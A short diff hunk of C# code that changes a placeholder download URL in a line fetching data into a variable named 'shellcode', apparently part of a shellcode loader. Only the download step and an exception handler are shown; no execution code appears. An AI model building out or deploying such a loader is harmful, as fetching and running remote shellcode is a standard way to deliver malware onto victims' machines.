@@ -35,7 +35,7 @@ internal class Program
         {
             try
             {
-                shellcode = webClient.DownloadData("[downloadlink]");
+                shellcode = webClient.DownloadData("[DOWNLOAD_LINK]");
             }
             catch (Exception ex)
             {
